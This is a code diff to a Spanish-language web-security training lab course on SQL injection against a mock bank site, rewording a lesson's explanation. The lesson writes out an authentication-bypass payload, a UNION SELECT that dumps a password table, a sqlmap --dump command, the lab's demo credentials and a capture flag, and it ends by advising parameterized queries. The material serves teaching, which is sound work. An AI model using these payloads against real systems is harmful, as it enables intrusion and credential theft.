@@ -319,7 +319,7 @@ const WEB_SQLI_UNION: Curso = {
       command:
         "curl -X POST http://banco.nande/login -d \"usuario=admin' -- &password=x\" && curl \"http://banco.nande/movimientos?q=a%' UNION SELECT id,usuario,password,rol FROM usuarios--\"",
       explain:
-        "En la tabla vas a ver las 4 cuentas del banco con sus contraseñas REALES, sacadas en vivo del motor SQL: admin/M8arete-2024!, rocio/girasol77, dario/boca123, sofia/qwerty. No estaban escritas en ningún lado: tu UNION las trajo de la tabla usuarios. La herramienta sqlmap automatiza justo esto (sqlmap -u \"http://banco.nande/movimientos?q=a\" --cookie \"sesion=...\" --dump) y registra la bandera ND{sqli_union_dump}. Defensa: consultas preparadas (parametrizadas), que separan la orden del dato para que tu texto NUNCA se vuelva SQL.",
+        "En la tabla vas a ver las 4 cuentas del banco con sus contraseñas REALES, sacadas en vivo del motor SQL: admin/M8arete-2024!, rocio/girasol77, dario/boca123, sofia/qwerty. No estaban escritas en ningún lado: tu UNION las trajo de la tabla usuarios, y al lograrlo capturás la bandera ND{sqli_union_dump}. La herramienta sqlmap automatiza justo esto (sqlmap -u \"http://banco.nande/movimientos?q=a\" --dump). Defensa: consultas preparadas (parametrizadas), que separan la orden del dato para que tu texto NUNCA se vuelva SQL.",
       diagram: "inyeccion",
     },
     {
